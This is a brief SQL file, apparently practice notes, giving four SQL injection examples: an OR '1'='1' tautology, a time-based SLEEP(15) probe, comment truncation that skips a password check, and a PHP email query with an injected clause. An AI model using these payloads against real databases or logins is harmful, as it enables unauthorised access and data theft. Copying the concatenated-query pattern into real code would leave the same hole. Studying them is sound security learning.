-- 1
SELECT * FROM productos WHERE id = '' OR '1' = '1' AND nombre = '' OR '1' = '1';

-- 2
select * from productos
WHERE id=1-SLEEP(15);

-- 3
SELECT * FROM productos WHERE nombre = 'carne'; -- ' AND password = 'mypassword';

-- 4
-- $q = "select * from usuarios where email='$email'";
-- $q = "select * from usuarios where email=‘karla'or'1'!=‘@unam.mx'";
-- $q = "select * from usuarios where email=‘karla'or'1'!=‘@unam.mx'";

SHOW TABLES;